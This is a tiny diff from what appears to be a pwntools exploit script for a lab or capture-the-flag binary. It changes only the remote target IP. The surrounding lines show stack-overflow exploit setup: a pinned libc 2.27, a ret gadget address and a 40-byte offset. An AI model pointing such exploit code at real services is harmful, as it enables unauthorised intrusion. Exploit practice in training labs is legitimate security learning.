@@ -7,7 +7,7 @@ context.log_level = 'debug'
 libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')
 
 # io = process()
-io = remote('10.10.210.191', 9009)
+io = remote('10.10.214.74', 9009)
 
 ret = p64(0x40101a)
 offset = 40
